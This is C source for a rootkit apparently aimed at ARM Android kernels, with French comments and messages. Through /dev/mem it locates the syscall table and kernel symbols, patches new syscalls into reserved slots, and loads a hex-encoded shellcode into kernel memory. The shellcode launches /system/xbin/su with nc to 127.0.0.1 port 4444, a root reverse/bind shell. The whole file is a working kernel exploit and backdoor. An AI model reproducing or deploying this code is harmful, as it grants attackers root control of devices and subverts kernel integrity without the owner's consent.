#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h> 
#include <sys/types.h>
#include <unistd.h>

#include "manipmem.h"

/*
  syscall use :
     - open
     - close
     - read
     - write
     - lseek  
     (en gros)
 strace ./rootkit &> test
 grep -v -E open\|close\|read\|write\|lseek test
*/


#define MODULE "/dev/mem"

#define OFFSET 0xc0000000

#define GFP_KERNEL 1

/* syscall number not implemented or reserved */
#define __NR_prepare_kernel_cred 0xbc
#define __NR_commit_creds        0xbd
#define __NR_kmalloc             0xa9

#ifndef __NR_close
#define __NR_close               0x06
#endif

#ifndef __NR_restart_syscall
#define __NR_restart_syscall     0x00
#endif

#define KM_STR      "__kmalloc"
#define RESTART_STR "sys_restart_syscall"
#define CLOSE_STR   "sys_close"
#define WRITE_STR   "sys_write"

#define MAX(a, b)				\
  (a > b ? a : b)

typedef struct buff_mem_t {
  char* mem;
  ulong size;
} buff_mem;

typedef struct a_addr_t {
  u_int32_t virt;
  u_int32_t phys;
} a_addr;

#define PATTERN 0xdeadbe00

typedef struct function_t {
  char *name;
  u_int32_t v_addr;
  u_int32_t pattern;
} function;

#define NB_FUN 2

char *load_fun[] = {
  "__kmalloc",
//  "kfree",
  "call_usermodehelper"
};

#define S_RVS  232
char reverse_bind_shell[S_RVS] = 
	"\x38\xb5"
	"\x6d\x46"
	"\x6a\x46"
	"\x7b\x46"
	"\x02\xe0"
	"\x00\x00"
	"\x00\x00"
	"\x00\xbf"
	"\x08\xb4"
	"\x7b\x46"
	"\x18\xe0"
	"\x50\x41"
	"\x54\x48\x3d\x2f"
	"\x73\x62\x69\x6e"
	"\x3a\x2f\x73\x79"
	"\x73\x74\x65\x6d"
	"\x2f\x73\x62\x69"
	"\x6e\x3a\x2f\x73"
	"\x79\x73\x74\x65"
	"\x6d\x2f\x62\x69"
	"\x6e\x3a\x2f\x73"
	"\x79\x73\x74\x65"
	"\x6d\x2f\x78\x62"
	"\x69\x6e"
	"\x08\xb4"
	"\x7b\x46"
	"\x04\xe0"
	"\x48\x4f"
	"\x4d\x45\x3d\x2f"
	"\x00"
	"\x00"
	"\x00\xbf"
	"\x08\xb4"
	"\x69\x46"
	"\x7b\x46"
	"\x01\xe0"
	"\x00\x00\x00\x00"
	"\x08\xb4"
	"\x7b\x46"
	"\x00\xe0"
	"\x26\x00"
	"\x08\xb4"
	"\x7b\x46"
	"\x08\xe0"
	"\x2f\x73"
	"\x79\x73\x74\x65"
	"\x6d\x2f\x78\x62"
	"\x69\x6e\x2f\x73"
	"\x75\x00"
	"\x00\xbf"
	"\x08\xb4"
	"\x7b\x46"
	"\x02\xe0"
	"\x2d\x65"
	"\x00"
	"\x00"
	"\x00\xbf"
	"\x08\xb4"
	"\x7b\x46"
	"\x02\xe0"
	"\x34\x34"
	"\x34\x34"
	"\x08\xb4"
	"\x7b\x46"
	"\x04\xe0"
	"\x31\x32"
	"\x37\x2e\x30\x2e"
	"\x30\x2e\x31\x00"
	"\x08\xb4"
	"\x7b\x46"
	"\x08\xe0"
	"\x2f\x73"
	"\x79\x73\x74\x65"
	"\x6d\x2f\x78\x62"
	"\x69\x6e\x2f\x6e"
	"\x63\x00"
	"\x00\xbf"
	"\x08\xb4"
	"\x78\x46"
	"\x08\xe0"
	"\x2f\x73"
	"\x79\x73\x74\x65"
	"\x6d\x2f\x78\x62"
	"\x69\x6e\x2f\x6e"
	"\x63\x00"
	"\x00\xbf"
	"\x01\x03\x4f\xf0"
	"\x01\x4c"
	"\xa0\x47"
	"\xad\x46"
	"\x38\xbd"
	"\x01\xbe\xad\xde";

/******************** utils ********************/

static u_int32_t
char_to_int(char *buff)
{
  return *((u_int32_t*) buff);
}

static void
write_int(char *buff, u_int32_t val)
{
  *((u_int32_t*) buff) = val;
}

static int
cond_int (char *buff, void *integer)
{
  u_int32_t val = (u_int32_t) integer;
  return char_to_int(buff) == val;
}

static int
cond_mem (char *buff, void *param)
{
  buff_mem bm = *(buff_mem*) param;
  return !(memcmp(buff, &bm.mem, bm.size));
}

static u_int32_t
read_addr(int fd, u_int32_t addr)
{
  char buff[P_SIZE];
  if (get_page(fd, buff, addr) < (addr & 0x00000fff))
    return 0;
  return char_to_int(buff + (addr & 0x00000fff));
}

static u_int32_t
is_function(function *funcs, u_int32_t pat)
{
  for (ulong i = 0; i < NB_FUN; i++)
    if (funcs[i].pattern == pat)
      return funcs[i].v_addr;
  return 0;
}

/******************** syscall_table hook ********************/


//#define FOR_THE_KIDS
#ifdef FOR_THE_KIDS

#define SYS_CLOSE                0xc0138a50 /* need adapt*/
#define SYS_RESTART_SYSCALL      0xc0032790 /* need adapt*/  

static int
sct_sys(char *buff, void *param)
{
  u_int32_t *buffer = (u_int32_t*) buff; 
  return (*(buffer + __NR_close)) == SYS_CLOSE &&
    (*(buffer + __NR_restart_syscall)) == SYS_RESTART_SYSCALL;
}

static u_int32_t
find_sct(int fd)
{
  condition c_sct;
  c_sct.cond = sct_sys;
  c_sct.marge = MAX(__NR_restart_syscall, __NR_close);
  c_sct.param = NULL;
  return scan_mem(fd, 0, c_sct, 1, 0, LIMIT);
}

#else
static int
sct_sys(char *buff, void *param)
{
  return (char_to_int(buff) & 0xfffff000) == 0xe28f8000;
}

static u_int32_t
find_sct(int fd)
{
  u_int32_t start = 0, end = 0x1fffffff;
  condition f_int;
  f_int.cond = sct_sys;
  f_int.marge = sizeof(u_int32_t);
  f_int.param = NULL;
  
  char buff[P_SIZE];
  u_int32_t obj, inc = 1;
  u_int32_t instr, offset;
  while (1)
  {
    obj = scan_mem(fd, start, f_int, inc, 0, end);
    if (obj == 0 || start > end)
      return 0;
    if (obj == start)
    {
      inc++;
      continue;
    }
    start = obj + 4;
    inc = 1;
    if (get_page(fd, buff, obj) != P_SIZE)
      continue;
    instr = char_to_int(buff + (obj & 0xfff));
    offset = (instr & 0xfff) + 8;
    return obj + offset;
  }
}
#endif

/******************** function hook by str ********************/

static int
cond_str (char *buff, void *param)
{
  char *str = (char*) param;
  return !(memcmp(buff, str, strlen(str + 1) + 2));
}

static char *
make_str(char *str, ulong *len)
{
  char *new = malloc(sizeof(char) * (strlen(str) + 2));
  if (new == NULL)
    return NULL;
  *len = strlen(str) + 2;
  new[0] = '\0';
  memcpy(new + 1, str, strlen(str));  
  new[*len] = '\0';
  return new;
}

static u_int32_t
find_fun_str(int fd, char *str)
{
  condition c_str;
  c_str.cond = cond_str;
  c_str.param = make_str(str, &c_str.marge);
  if (c_str.param == NULL)
    return 0;
  u_int32_t addr = scan_mem(fd, 0, c_str, 1, 1, LIMIT);
  free(c_str.param);
  if (addr == 0)
    return 0;
  addr++;
  fprintf (stdout, "\t[*] %s : kstrtab trouve a %08x\n", str, addr + OFFSET);
 
  condition c_addr;
  c_addr.cond = cond_int;
  c_addr.marge = sizeof (u_int32_t);
  c_addr.param = (void*) (addr + OFFSET);
  addr = find_lower_near(fd, addr, c_addr, 0);
  if (!addr)
    return 0;
  addr -= 4;
  fprintf (stdout, "\t[*] %s : ksymtab trouve a %08x\n", str, addr + OFFSET);
  return read_addr(fd, addr);
}

static function *
find_functions(int fd, char **str_fun, ulong count)
{
  function * funcs = malloc(sizeof(struct function_t) * count);
  if (funcs == NULL)
    return NULL;
  u_int32_t a_virt;
  for (ulong i = 0; i < count; i++)
  {
    a_virt = find_fun_str(fd, str_fun[i]);
    if (a_virt == 0)
    {
      free(funcs);
      return NULL;
    }
    funcs[i].name    = str_fun[i];
    funcs[i].v_addr  = a_virt;
    funcs[i].pattern = PATTERN + i; 
  }
  return funcs;
}


/******************** memory allocation ********************/

static int
add_syscall(int fd, u_int32_t sct, u_int32_t syscall, int num)
{
  return write_mem(fd, sct + num * sizeof(u_int32_t),
		   (char*) &syscall, sizeof(u_int32_t));
}

static a_addr
alloc_memory(int fd)
{
  a_addr addr;
  addr.virt = syscall(__NR_kmalloc, P_SIZE, GFP_KERNEL);
  addr.phys = (addr.virt) ? addr.virt - OFFSET : 0;
  return addr;
}

static void
link_buff(function * funcs, char *buff, ulong size)
{
  u_int32_t tmp;
  for (ulong i = 0; i < size - 3; i++)   /* :( */
  {
    tmp = is_function(funcs, char_to_int(buff + i));
    if (tmp)
      write_int(buff + i, tmp);
  }
}

/******************** print & main ********************/

static int
print_page(int fd, u_int32_t page)
{
  char buff[P_SIZE];
  get_page(fd, buff, page);
  fprintf(stdout, "[*] Affichage de la page %08x: %08x\n" , page, char_to_int(buff));
  for (ulong i = page & 0xfff; i < P_SIZE; i+=4)
  {
    fprintf(stdout, "0x%08x ", char_to_int(buff + i));
    if (i % 20 == 0)
      fprintf(stdout, "\n");
  }
  return 0;
}

int
main(int argc, char **argv)
{

  fprintf(stdout, "[+] Ouverture de %s\n", MODULE);
  function * funcs = NULL;
  int module = open(MODULE, O_RDWR);
  if (module < 0)
  {
    fprintf (stderr, "\t[-] Impossible d'ouvrir le module %s\n", MODULE);
    return EXIT_FAILURE;
  }
  
  fprintf(stdout, "[+] Recuperation de la table des appels sytemes\n");
  u_int32_t syscall_table = find_sct(module);
  if (!syscall_table)
  {
    fprintf(stderr, "\t[-] Table des appels systemes non trouve\n");
    goto fin;
  }
  fprintf(stdout,
	  "[+] Table des appels systemes trouve a : %08x\n",
	  syscall_table);
  fprintf(stdout,
	  "[+] Adresse virtuelle de la table suppose a : %08x\n",
	  syscall_table + OFFSET);
  /*
  fprintf(stdout, "[+] Recherche de sys_call_table par str...\n");
  u_int32_t v_sct = find_fun_str(module, "sys_call_table");
  if (v_sct != 0)
    fprintf (stdout, "[+] %s trouve a : %08x\n", "sys_call_table", v_sct);
  else
  {
    fprintf(stderr,"\t[-] Erreur %s non trouve\n", v_sct);
    goto fin;
  }
  fprintf(stdout,
	  "[+] Offset de  : %08x\n", v_sct - syscall_table);
  */
  
  fprintf(stdout, "[+] Recherche de kmalloc par str...\n");

  u_int32_t km_addr = find_fun_str(module, KM_STR);
  if (km_addr != 0)
    fprintf (stdout, "[+] %s trouve a : %08x\n", KM_STR, km_addr);
  else
  {
    fprintf(stderr,"\t[-] Erreur %s non trouve\n", KM_STR);
    goto fin;
  }
  
  fprintf(stdout,
	  "[+] Creation de l'appel system kmalloc a : %d\n", __NR_kmalloc);
  if (add_syscall(module, syscall_table, km_addr, __NR_kmalloc) < 0)
  {
    fprintf(stderr, "\t[-] Echec de la creation\n");
    goto fin;
  }
  else
    fprintf(stdout, "[+] Creation reussi, appel %d : %08x\n",
    __NR_kmalloc, read_addr(module, syscall_table + __NR_kmalloc * 4));

  fprintf(stdout,
	  "[+] Recherche des fonctions ...\n");
  funcs = find_functions(module, load_fun, NB_FUN);
  if (funcs == NULL)
  {
    fprintf(stderr, "\t[-] Impossible de trouver toutes les fonctions\n");
    goto fin;
  }
  fprintf(stdout,
	  "[+] Allocation de la memoire et edition de liens\n");
  a_addr a_payload = alloc_memory(module);
  if (!a_payload.virt)
  {
    fprintf(stderr, "\t[-] Impossible d'allour la memoire\n");
    goto fin;
  }
  fprintf(stdout,
	  "[+] Memoire alloue a %08\n", a_payload.virt);

  fprintf(stdout,
	  "\t[!] Apparition de probleme possible maintenant car\n"
          "\t    on suppose un offset vrai, "
	  "\t    l'automatisation de son calcul arrivera plus tart\n");

  link_buff(funcs, reverse_bind_shell, S_RVS);
  /*
  for (int i = 0; i < S_RVS; i += 4)
  fprintf (stdout, "\t[*] %08x\n", char_to_int(reverse_bind_shell + i));*/
  write_mem(module, a_payload.phys, reverse_bind_shell, S_RVS);
  
  fprintf(stdout,
	  "[+] Creation de l'appel system bind_shell a : %d\n",
	  __NR_commit_creds);
  if (add_syscall(module, syscall_table, a_payload.virt, __NR_commit_creds) < 0)
  {
    fprintf(stderr, "\t[-] Echec de la creation\n");
    goto fin;
  }
  else
    fprintf(stdout, "[+] Creation reussi, appel %d : %08x\n",
    __NR_commit_creds,
	    read_addr(module, syscall_table + __NR_commit_creds * 4));

  fprintf(stdout, "[+] Appel du reverse_bind_shell\n");

  syscall(__NR_commit_creds);
  fprintf(stdout, "[+] Fin du programme\n");
fin:
  if (funcs != NULL)
    free(funcs);
  close(module);  
  return EXIT_SUCCESS;
}
